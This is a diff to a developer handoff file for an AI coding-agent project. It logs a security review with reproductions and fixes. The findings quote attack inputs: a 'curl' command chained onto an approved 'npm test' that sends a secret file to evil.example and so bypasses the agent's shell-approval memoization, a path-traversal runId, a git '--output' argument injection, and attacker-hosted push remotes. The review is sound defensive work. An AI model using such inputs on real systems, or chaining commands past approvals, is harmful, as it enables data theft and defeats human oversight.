@@ -7,13 +7,13 @@ file is the time-stamped snapshot of where the project actually stands.
 
 **Snapshot as of:** 2026-08-18
 **Branch:** `claude/handoff-prompt-continuation-c2cxh9`
-**Latest commit:** `0d50179` — "fix: three real bugs found by a code-review pass on this session's work"
-**Test suite:** 595/595 passing, 69 test files, clean `tsc -b`, clean `eslint .`
+**Latest commit:** `5b9c954` — "fix: eight vulnerabilities and correctness bugs found by a full-history security review"
+**Test suite:** 608/608 passing, 69 test files, clean `tsc -b`, clean `eslint .`
 
-**PR:** [#9](https://github.com/Derric01/ClutchCode/pull/9) — open, not
-yet merged. #8 merged cleanly. Pattern established across #4 through #9:
-one open PR per phase of work, never reused once merged, branch always
-restarted from `main`'s merged tip before new commits land on it.
+**PR:** to be opened for this round (#9 merged cleanly, as did #4–#8
+before it). Pattern established across every phase so far: one open PR
+per phase of work, never reused once merged, branch always restarted
+from `main`'s merged tip before new commits land on it.
 
 ---
 
@@ -390,6 +390,147 @@ real product built in phases, not a minimum-viable throwaway. Touched
 three `research/` notes, and doc comments in five packages. Pure rename,
 zero behavior change.
 
+### Full-history security review — six vulnerabilities + two correctness bugs found and fixed, one false positive rejected
+Requested as "review everything, security plus like all, till now" — not
+scoped to a single diff. Ran the `security-review` skill's own described
+methodology (parallel finder subagents fanned out by subsystem — redaction/
+transcript persistence, policy/approval engine, git worktree + remote
+handling, tool argument construction, sandbox temp-file handling — then a
+parallel false-positive-filter subagent per finding, confidence ≥8 kept),
+personally orchestrated via the `Agent` tool since the skill's own `git
+diff origin/HEAD...` auto-detection had nothing to diff against (everything
+prior was already merged). Every finding was independently reproduced in a
+real throwaway repo/fixture before being trusted — the session's standing
+"verify before fixing" discipline, applied here at larger scale than any
+prior round:
+
+1. **§5.2 redaction bypass in `AgentLoop`'s `model.response` event.**
+   `state.messages` (and the transcript it feeds) already redacted the
+   model's own reply text via `pushMessage`, but the `model.response`
+   *runtime event* — a separately persisted artifact, written verbatim to
+   `<stateDir>/runs/<runId>/events.jsonl` by `agent-api`'s `appendEvent` —
+   used the raw, unredacted `response.text` directly. A model quoting a
+   secret it had just read back (e.g. summarizing a `.env` it opened)
+   would leak it into that log regardless of the transcript being clean.
+   Reproduced with a `FakeProvider` turn that echoes the redaction canary
+   in its reply text and asserting the emitted event; the pre-fix version
+   fails this assertion (confirmed via `git stash`). Fixed by scrubbing
+   `response.text` through the existing `Redactor` before emitting the
+   event — `state.messages` still gets the raw text, unchanged. Also
+   extended `evals/src/redaction-canary.test.ts`'s full-stack SSE-scripted
+   integration test to have the model's own final reply echo the canary
+   too, since the original test only injected it via a tool-call argument
+   and would never have caught this specific gap.
+2. **§12.2 approval-memoization bypass in the shell tool.**
+   `PolicyEngine.decide()` memoizes non-destructive `ALLOW` decisions per
+   `commandClass` for a run's lifetime (the "approval fatigue" mitigation)
+   — `commandClassOf` derived that class as just the first two
+   whitespace-split tokens, with no check for shell metacharacters.
+   Reproduced for real: approve `"npm test"` once via
+   `ctx.policy.remember("npm test", "ALLOW")`, then attempt `"npm test &&
+   curl http://evil.example/x --data-binary @secret.txt"` — pre-fix, this
+   is silently allowed with no prompt, because both strings share the same
+   first two tokens. Fixed by having `commandClassOf` fall back to the
+   *full* trimmed command as its own class whenever it contains a shell
+   metacharacter (`; & | \` < > \n` or `$(`), tested directly against all
+   of those plus a literal newline, so a compound command can never ride
+   in on a simple command's remembered approval.
+3. **§13.1 `runId` path traversal in `createRunWorktree`.** The `runId`
+   is joined straight into `<stateDir>/wt/<runId>` with no validation, and
+   it's attacker/model-reachable over the real JSON-RPC `run` method
+   (`agent-rpc`'s untrusted-input boundary), not just an internal ID.
+   Reproduced by calling `createRunWorktree` directly with `runId:
+   "../../../../../../tmp/pwned-worktree"` (confirmed pre-fix it resolves
+   clean out of `<stateDir>/wt/` via ordinary `path.join` `..`
+   normalization — no error, no containment check) and separately end-to-
+   end over the real `agent-rpc` client/server pair. Fixed with a strict
+   `^[A-Za-z0-9_-]+$` allow-list on `runId` plus a defense-in-depth
+   `path.relative`-based containment check on the resolved path. New tests
+   at both the `worktree.ts` unit level (four `runId` values, three
+   throwing, one legitimate one not) and the `agent-rpc` integration level
+   (the exploit string rejected over the real RPC boundary, target
+   directory confirmed never created).
+4. **Git-log argument injection → arbitrary file write.** The `git`
+   tool's `log` op built its args as `` [`-${args.arg ?? "10"}`,
+   "--oneline"] `` — reproduced by constructing a real git repo and
+   calling `gitTool.run({ op: "log", arg: "-output=/tmp/x" })`: git parses
+   the code's own leading `-` plus the arg's own leading `-` as a `--`
+   long option, so this genuinely creates `/tmp/x` via git's `--output`
+   flag (first reproduction attempt without the arg's own leading dash
+   failed with "unrecognized argument" — the double-dash mechanism only
+   triggers when the *arg itself* starts with `-`). Fixed by only ever
+   accepting a bare non-negative integer count for `arg` (validated by
+   regex) and passing it as `git log -n <count>`, falling back to the
+   default `10` for anything else — no string interpolation into a
+   dash-prefixed position at all anymore.
+5. **Unvalidated git `remote` parameter in `remoteUrl`/`pushBranch`.**
+   Any string was accepted as a "remote name" and passed straight to
+   `git`, with no check that it's an actual configured remote rather than
+   a URL or transport string — a push-destination-redirection/
+   exfiltration risk (a value like `https://attacker.example/evil.git` or
+   `git@attacker.example:evil/repo.git` would be used as-is). A subagent
+   initially flagged this as default-on RCE via `ext::<command>`;
+   investigated and downgraded rather than taken at face value —
+   `git push -u "ext::sh -c '...'" main"` against a real throwaway repo
+   returned `fatal: transport 'ext' not allowed`, because git's actual
+   default for `protocol.ext.allow` specifically is `never` (not the
+   general `user` default that applies to *other* unlisted protocols, as
+   the subagent had claimed). The underlying unvalidated-parameter issue
+   is still real and worth closing on its own merits, just correctly
+   framed as redirection/exfiltration risk rather than default-on RCE.
+   Fixed with a strict `^[A-Za-z0-9_.-]+$` remote-name allow-list,
+   rejecting anything that looks like a URL or transport string; tested
+   against all three example payloads plus confirming `"origin"` still
+   works.
+6. **Predictable seccomp filter temp-file path.**
+   `ensureSeccompFilterFile` wrote the compiled BPF filter to a fixed,
+   predictable filename in the shared system temp directory — a co-
+   resident local user could pre-plant a symlink there ahead of the
+   write. Fixed by writing into a freshly `fs.mkdtempSync`'d (POSIX-
+   guaranteed mode-0700) subdirectory via `O_WRONLY|O_CREAT|O_EXCL`, so
+   the write structurally refuses to follow a pre-existing symlink or
+   file at the target path — proven both by asserting the new path shape
+   (fresh random subdirectory, mode 0700) and by directly exercising the
+   `O_EXCL` primitive against a deliberately pre-planted symlink.
+7. **Edit-cascade leading-`...` ellipsis-elision bug** (correctness, not
+   security, caught along the way). A SEARCH block that opens with its
+   own `...` line — eliding everything before the first real anchor —
+   was rejected unconditionally, no matter how well the rest matched.
+   `applyEllipsisSegments` only ever set `firstMatchIdx` on loop index
+   `0`, but a leading ellipsis makes segment `0` the empty elided segment,
+   which hits the `seg.length === 0` branch and `continue`s straight past
+   that assignment — so `firstMatchIdx` stayed `-1` and the whole edit
+   was reported as "SEARCH block did not match" regardless of what
+   followed. Fixed by setting `firstMatchIdx` on the first segment that
+   actually matches content, not the first segment by index. New test
+   uses the same fixture as the existing passing ellipsis test, with the
+   SEARCH block starting directly on `...`.
+8. **Toolchain-memory `correctToolchainFact` stale-hash bug**
+   (correctness, directly violates §10.3 point 4, "human edits win").
+   A human correction (`agent memory correct`) reused the cached record's
+   existing `manifestHash` verbatim. If that hash was already stale (e.g.
+   `package.json` had been edited since the last derive, before the
+   correction ran), the very next `getOrDetectToolchain` call would see
+   the mismatch, conclude the whole record untrustworthy, and silently
+   re-derive from scratch — discarding the human's correction with no
+   warning. Reproduced by editing `package.json` between the initial
+   derive and the correction, then confirming the correction didn't
+   survive the next cache-hit read (pre-fix). Fixed by always stamping
+   the *current* manifest hash (recomputed on the spot) whenever a
+   correction is written, not just when creating a brand-new record.
+
+608 total tests after all eight fixes (up from 595), clean `tsc -b`,
+clean `eslint .`. Six of the eight fixes (everything except the remote-
+name validator and the seccomp path fix, whose correctness follows
+directly and unambiguously from their own assertions with no ambiguity
+to double-check) were verified with the full rigor cycle: `git stash
+push -- <file>` to revert just the fix, rerun the new test and confirm
+it fails, `git stash pop` to restore it, rerun and confirm it passes.
+As with the prior code-review pass: this is a single review round, not
+a bug-bounty-grade exhaustive audit — the honest claim is "these eight
+were confirmed real (or, for the ninth, confirmed *not* real) and
+fixed/corrected," not "this codebase now has zero security issues."
+
 ---
 
 ## What's left
@@ -515,6 +656,28 @@ loose "MVP" estimate.
   space), double-check which path is actually being used as the cache
   *key* versus the *content source* — they're very easy to conflate when
   one function reads from disk and persists to disk in the same call.
+- **`git`'s real default for `protocol.ext.allow` is `never`, not the
+  general `user` default.** Most unlisted/user-defined protocols default
+  to allowed-when-explicitly-invoked (`user`), but `ext::<command>` (and a
+  couple of other known-dangerous transports) are special-cased to
+  `never` by git itself — confirmed by actually running `git push -u
+  "ext::sh -c '...'" main` against a real throwaway repo and getting
+  `fatal: transport 'ext' not allowed`, not by trusting a subagent's
+  claim. Don't assume a "closes an RCE" security finding about `ext::` is
+  accurately scoped without checking git's actual compiled-in default for
+  that specific protocol — it's a real risk only on a host where an admin
+  has explicitly re-enabled it.
+- **A single leading `-` prepended to an LLM/caller-controlled CLI arg
+  can become a double-dash long option if the arg itself also starts with
+  `-`.** `` `-${arg}` `` with `arg = "output=/tmp/x"` produces `-output=…`
+  (harmless — git doesn't recognize single-dash long options), but `arg =
+  "-output=/tmp/x"` produces `--output=/tmp/x`, a real long option. Bit
+  the `git log` tool's `arg` → `-${arg}` count-shorthand construction for
+  real (§ "Full-history security review" in "what's done"). Any code that
+  prepends a single fixed dash to a value it doesn't fully control needs
+  to validate the value's *shape* (e.g. "must be a bare digit string"),
+  not just its absence of malice — a value that's merely "not obviously
+  a flag" can still smuggle one in via its own leading dash.
 
 ## How to resume
 
